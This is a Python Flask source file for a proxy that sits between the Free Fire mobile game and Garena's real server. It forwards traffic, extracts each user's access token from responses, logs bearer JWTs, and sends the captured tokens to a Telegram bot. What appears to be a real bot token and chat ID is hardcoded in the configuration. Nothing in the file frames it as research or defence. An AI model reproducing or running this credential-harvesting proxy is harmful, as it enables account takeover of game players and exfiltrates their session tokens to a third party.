from flask import Flask, request, jsonify, Response
import requests
import json
import os
import re
import base64
from datetime import datetime

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
# The real Garena server URL (from your earlier JSON)
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')

# Secret key to protect your endpoint (optional)
SECRET = os.environ.get('CAPTURE_SECRET', 'mySecret123')

# Telegram alerts (optional)
TELEGRAM_BOT_TOKEN = os.environ.get('8199355245:AAEXNVzd9lZUv5fvT9axmJ3rNbcSPUh56QA', '')
TELEGRAM_CHAT_ID = os.environ.get('6261108215', '')
# ─────────────────────────────────────────────────────────────────

def send_telegram(msg):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"})
    except:
        pass

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy(user_id, subpath):
    """
    Forward all requests to the real Garena server,
    capture the response, extract the hex access token.
    """
    # ── Security check ──
    secret = request.args.get('secret')
    if secret != SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    # ── Build the real URL ──
    if subpath:
        real_url = f"{REAL_SERVER}/user/{user_id}/{subpath}"
    else:
        real_url = f"{REAL_SERVER}/user/{user_id}/"

    # ── Forward request ──
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
    # Remove any 'content-length' that might be wrong – requests will set it automatically
    headers.pop('Content-Length', None)

    try:
        # Forward the request with the same method, headers, and body
        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),          # raw body
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
    except Exception as e:
        print(f"❌ Proxy error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

    # ── Log the response ──
    print(f"\n🔹 Proxied {request.method} {real_url}")
    print(f"   Response status: {resp.status_code}")

    # ── Extract hex access token ──
    hex_token = None
    try:
        # Try to parse as JSON
        data = resp.json()
        hex_token = data.get('access_token')
        if hex_token:
            print(f"✅ HEX ACCESS TOKEN CAPTURED: {hex_token}")
            # Send to Telegram
            send_telegram(
                f"🎯 <b>Hex Access Token Captured!</b>\n"
                f"User: {user_id}\n"
                f"Token: <code>{hex_token}</code>"
            )
        else:
            print("   No 'access_token' in JSON response.")
    except:
        # Not JSON – maybe binary or plain text
        # Search for 64‑character hex pattern in the raw response
        raw_body = resp.text
        hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
        matches = hex_pattern.findall(raw_body)
        if matches:
            hex_token = matches[0]
            print(f"✅ HEX ACCESS TOKEN FOUND IN RAW: {hex_token}")
            send_telegram(
                f"🎯 <b>Hex Access Token (raw)</b>\n"
                f"User: {user_id}\n"
                f"Token: <code>{hex_token}</code>"
            )
        else:
            print("   No hex token found in response.")

    # ── Also log JWT from Authorization header (if any) ──
    auth_header = request.headers.get('Authorization')
    if auth_header and auth_header.startswith('Bearer '):
        jwt = auth_header[7:]
        print(f"   JWT in request: {jwt[:50]}...")

    # ── Return the real server's response back to the game ──
    # Exclude some headers that may cause issues
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    response_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded_headers]

    return Response(
        resp.content,
        status=resp.status_code,
        headers=response_headers
    )

@app.route('/')
def home():
    return "Token capture proxy is running!", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)